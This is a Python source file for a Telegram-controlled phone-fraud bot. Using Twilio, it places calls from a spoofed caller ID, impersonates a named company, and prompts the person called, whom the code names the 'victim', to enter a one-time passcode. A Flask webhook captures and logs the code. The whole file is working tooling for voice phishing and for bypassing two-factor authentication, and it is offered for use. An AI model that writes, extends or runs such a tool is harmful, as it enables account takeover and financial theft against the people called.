import json
import os
import logging
import threading
from flask import Flask, request
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
from telegram import Update, Bot
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import phonenumbers
import asyncio
from concurrent.futures import ThreadPoolExecutor

# Initialize Flask app for webhook
app = Flask(__name__)

# Set up logging
logging.basicConfig(filename='app.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

# Configuration file location
CONFIG_FILE = "config.json"

# Load or initialize configuration
def load_config():
    try:
        with open(CONFIG_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {
            "TWILIO_SID": "",
            "TWILIO_AUTH_TOKEN": "",
            "TWILIO_PHONE_NUMBER": "",
            "TELEGRAM_BOT_TOKEN": "",
            "CALLBACK_URL": "http://your-callback-url",
            "otp_length": 6,
            "language": "en",
            "ai_enabled": False,
            "log_level": "INFO",
            "call_timeout": 30,
            "retry_attempts": 3,
            "schedule_enabled": False,
            "ai_prompt": "Please enter the OTP you have received.",
            "company_name": "Default Company",
            "spoof_number": "",
            "prompts": {}  # Store prompts here
        }
    except json.JSONDecodeError:
        logger.error("Invalid configuration file format. Resetting to defaults.")
        return {}

# Save updated configuration to file
def save_config(new_config):
    with open(CONFIG_FILE, "w") as file:
        json.dump(new_config, file)

# Validate phone number format using phonenumbers library
def validate_phone_number(number):
    try:
        parsed_number = phonenumbers.parse(number, None)
        return phonenumbers.is_valid_number(parsed_number)
    except phonenumbers.NumberParseException:
        return False

# Flask route to handle OTP input from Twilio
@app.route("/otp", methods=["POST"])
def receive_otp():
    otp = request.form.get("Digits", None)
    if not otp:
        return "Invalid input received", 400
    logger.info(f"Received OTP: {otp}")
    return "Thank you!", 200

# Asynchronous function for initiating a call
async def async_initiate_call(victim_number, prompt, spoof_number, company_name, language="en"):
    try:
        client = Client(config["TWILIO_SID"], config["TWILIO_AUTH_TOKEN"])
        voice_response = VoiceResponse()

        # Create a Gather object to capture key presses
        gather = Gather(input='dtmf', timeout=5, num_digits=config["otp_length"], action=f"{config['CALLBACK_URL']}/otp")
        gather.say(f"Hello, this is {company_name}. {prompt}")
        voice_response.append(gather)

        # If no input is received, handle that
        voice_response.say("We didn't receive any input. Goodbye.")

        # Make the call using the spoofed number
        call = client.calls.create(
            to=victim_number,
            from_=spoof_number,
            twiml=str(voice_response),
            status_callback=f"{config['CALLBACK_URL']}/status",
            timeout=config["call_timeout"]
        )
        logger.info(f"Call initiated to {victim_number}. Company: {company_name}, Spoofed from: {spoof_number}, Prompt: {prompt} (Call SID: {call.sid})")
    except Exception as e:
        logger.error(f"Error initiating call: {e}")
        raise ValueError("Failed to initiate the call. Please check your Twilio configuration or the provided phone numbers.")

# Telegram command to trigger OTP call
async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 5:
        await update.message.reply_text("Usage: /custom <victimnumber> <company_name> <spoof_number> <full_name> <prompt_key>")
        return

    victim_number = args[0]
    company_name = args[1]
    spoof_number = args[2]
    full_name = args[3]
    prompt_key = args[4]

    if not validate_phone_number(victim_number):
        await update.message.reply_text("Invalid phone number format.")
        return

    if not validate_phone_number(spoof_number):
        await update.message.reply_text("Invalid spoof number format.")
        return

    if prompt_key not in config["prompts"]:
        await update.message.reply_text(f"Prompt key '{prompt_key}' does not exist.")
        return

    prompt = config["prompts"][prompt_key]
    prompt = f"{prompt}, {full_name}"

    try:
        await async_initiate_call(victim_number, prompt, spoof_number, company_name, config["language"])
        await update.message.reply_text(f"Simulated call initiated to {victim_number} with company name: {company_name} and spoofed number: {spoof_number}.")
    except ValueError as ve:
        await update.message.reply_text(str(ve))

# Function to reset the configuration to default values
def reset_to_defaults():
    global config
    config.clear()
    config.update(load_config())

# Function to start the Telegram bot
def start_bot():
    application = ApplicationBuilder().token(config["TELEGRAM_BOT_TOKEN"]).build()
    application.add_handler(CommandHandler("custom", custom_command))
    application.run_polling()

# Load the configuration
config = load_config()

# Start the bot and Flask application in separate threads
if __name__ == "__main__":
    # Start Flask app in a separate thread
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000)).start()

    # Start the Telegram bot
    start_bot()

